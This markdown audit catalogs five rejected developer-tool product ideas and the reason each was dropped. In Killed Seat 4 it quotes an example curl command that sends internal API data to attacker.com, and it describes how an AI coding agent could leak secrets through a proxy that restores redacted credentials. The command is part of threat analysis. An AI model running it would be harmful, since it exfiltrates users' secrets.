# Killed Candidate Audit: Negative Proofs & Discarded Seats

Under the **Profinder** discipline, a hunt that only emits positive "keeps" without documenting negative proofs has failed. 
During our exploration across the substrate inventory, multiple raw seats were generated and subjected to Profinder's deny patterns, auto-reject filters, and calibration cases.

Below is the exhaustive catalog of **killed seats**, documenting the exact collapse modes and evidence that disqualified them.

---

## Killed Seat 1: The Merge-Stack Bundle (Queue Scheduling + AST Merge + AI Conflict Bot)

*   **Proposed Stack Placement:** AST-aware collision graph + impacted target test runner + LLM agent conflict synthesizer sold as a unified Git merge automation SKU.
*   **Substrate:** CI scheduler / merge queue.
*   **Intended Deliverable:** An end-to-end pull request merge coordinator.
*   **Collapse Mode:** **Occupied bundle sold as one SKU** (Calibration Case 1).
*   **Incumbent Reality:**
    *   Syntax-aware merge tools already exist and occupy the merge slice: [Mergiraf](https://mergiraf.org/) and [SemaMerge](https://github.com/marnix/SemaMerge).
    *   Interference-graph parallel merge queues are already commercialized by [Trunk Merge Queue](https://trunk.io/merge-queue).
    *   Test Impact Analysis is occupied by Datadog TIA and [Nx](https://nx.dev/).
    *   Automated conflict resolution bots already operate in PR workflows: [CodeRabbit](https://coderabbit.ai/) and [GitButler](https://gitbutler.com/).
*   **Verdict:** `drop` as a company (`as_company: Occupied 6.5`). 
*   **Lesson:** Packaging three already-occupied slices into one marketing slogan does not create a sparse seat.

---

## Killed Seat 2: Worktree Loopback Port Isolation Daemon

*   **Proposed Stack Placement:** Local daemon that automatically isolates localhost TCP ports (`127.0.0.1`) across concurrent git worktrees.
*   **Substrate:** Process supervisor / daemon.
*   **Intended Deliverable:** CLI tool managing network namespaces or loopback IP aliases (`127.0.0.2`, `127.0.0.3`) per worktree.
*   **Collapse Mode:** **File it on the incumbent / 50-line script** (Deny Pattern #1, Auto-Reject #2).
*   **Incumbent Reality:**
    *   The tool [silo](https://github.com/graphprotocol/silo) already ships the headline UX for loopback and worktree isolation.
    *   The remaining mechanical difference is easily implemented via a 20-line shell function binding `PORT=$((3000 + WORKTREE_ID))` or assigning loopback aliases via `ifconfig lo0 alias`.
*   **Verdict:** `file_on` / `drop` (`as_company: Saturated 8.5`).
*   **Lesson:** A minor parameter tweak to an existing tool's workflow is a pull request, not a venture-backed company.

---

## Killed Seat 3: Universal Offline SQL Mutation Upcast Engine

*   **Proposed Stack Placement:** Offline schema migrator that automatically rewrites and upcasts destructive SQL mutations into non-destructive backward-compatible expand-contract views without application developer intervention.
*   **Substrate:** Schema / tenancy cutover.
*   **Intended Deliverable:** CLI compiler that translates `ALTER TABLE DROP COLUMN` or type changes into automatic shadow table triggers.
*   **Collapse Mode:** **Mathematically non-invertible transform** (Auto-Reject #3).
*   **Incumbent Reality:**
    *   Arbitrary SQL mutations (such as merging two columns into a computed JSON field, or lossy type truncation) are mathematically non-invertible.
    *   Any tool claiming to "automatically and safely" invert lossy schema transformations without human-defined mapping functions is fundamentally misleading users about its guarantees.
*   **Verdict:** `drop` (Fatal Auto-Reject #3).
*   **Lesson:** If the core transform cannot mathematically guarantee data fidelity, the pitch relies on false claims.

---

## Killed Seat 4: AI Coding Agent Sandbox Secret Reverse-Mapper

*   **Proposed Stack Placement:** PTY terminal wrapper that redacts real secrets (API keys, passwords) from AI coding agents, intercepts egress HTTP calls from the agent, and dynamically rehydrates the original secrets in-flight.
*   **Substrate:** Host runtime enforcement / Process supervisor.
*   **Intended Deliverable:** Local proxy shielding credentials from LLM prompt context while allowing live API testing.
*   **Collapse Mode:** **Reverse-mapping a security control / Confused deputy** (Auto-Reject #4).
*   **Incumbent Reality:**
    *   An agent with access to an in-flight rehydrating proxy can trivially exfiltrate secrets via side-channels (e.g., executing `curl https://attacker.com/?leak=$(curl https://internal.api/user)` or embedding the credential into an external reflection query).
    *   This creates a severe "confused deputy" vulnerability where the wrapper provides an illusion of safety while enabling unconstrained credential leakage.
*   **Verdict:** `drop` (Fatal Auto-Reject #4).
*   **Lesson:** Security wedges that rely on obfuscation or dynamic de-redaction collapse against basic side-channel attacks.

---

## Killed Seat 5: Third-Party Infrastructure Lockfile without Host Runtime Enforcement

*   **Proposed Stack Placement:** Deterministic dependency lockfile generator for OpenTofu / Terraform modules and cloud providers.
*   **Substrate:** Compiler, linker, bundler, lockfile.
*   **Intended Deliverable:** CLI tool generating a custom `tofu.lock.json` file to track module hashes and verify integrity before running plans.
*   **Collapse Mode:** **Sidecar without host runtime enforcement** (Auto-Reject #7, Deny Pattern #3).
*   **Incumbent Reality:**
    *   OpenTofu and Terraform already maintain their own native `.terraform.lock.hcl` provider lockfile.
    *   A third-party module lockfile (`tofulock`) is completely ignored by the underlying `tofu` or `terraform` binary unless developers manually wrap every execution.
    *   As soon as a developer runs `tofu init` directly, the third-party lockfile is bypassed.
*   **Verdict:** `drop` (`as_company: Occupied 7.0`).
*   **Lesson:** A lockfile or policy that the host platform does not natively consult is advisory theater, not runtime enforcement.

